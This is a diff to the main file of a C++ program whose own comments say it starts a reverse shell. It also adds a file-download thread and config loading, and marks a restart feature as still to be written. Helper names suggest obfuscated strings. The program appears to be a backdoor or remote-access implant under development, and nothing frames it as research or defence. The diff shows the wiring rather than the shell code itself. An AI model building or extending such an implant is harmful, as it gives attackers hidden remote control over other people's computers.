@@ -5,12 +5,13 @@
 
 #define DEBUG
 
-#include<stdio.h>
-#include<iostream>
+#include <stdio.h>
+#include <iostream>
 //#include"include/httplib/httplib.h"
-#include<string.h>
-#include"shell.hpp"
-#include<vector>
+#include <string.h> 
+#include "shell.hpp"
+#include <vector>
+#include "config.hpp"
 
 constexpr auto xiran_strlen(const char* str)
 {
@@ -81,9 +82,16 @@ void get_config()
 int main()
 {
     // printf("%s\n",get_xiran_string(0).get());
+
+    //子线程队列
     std::vector<std::thread> thread_vec;
 
+    //获取配置文件
     get_config();
+
+    //开启文件获取线程，防止文件下载出错影响主线程
+    auto th = std::thread(start_file_get);
+    th.join();//之后的定时任务可能会使用到下载的文件，所以等待此线程
 
     //启动反弹shell
     shell_start(thread_vec);
@@ -93,6 +101,8 @@ int main()
     for (size_t i = 0; i < thread_vec.size(); ++i) {
         thread_vec[i].join();
     }
+
+    //待实现  重启功能
 
     return 0;
 }
